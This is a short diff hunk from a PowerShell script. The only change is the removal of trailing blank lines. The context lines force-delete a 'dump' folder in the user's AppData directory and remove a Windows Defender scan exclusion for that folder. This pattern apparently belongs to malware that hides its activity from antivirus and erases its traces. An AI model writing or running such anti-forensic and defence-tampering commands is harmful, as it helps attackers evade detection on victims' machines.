@@ -35,5 +35,3 @@ Start-Sleep -Seconds 6
 cd "$env:appdata"
 Remove-Item -Path "$env:appdata\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
-
-
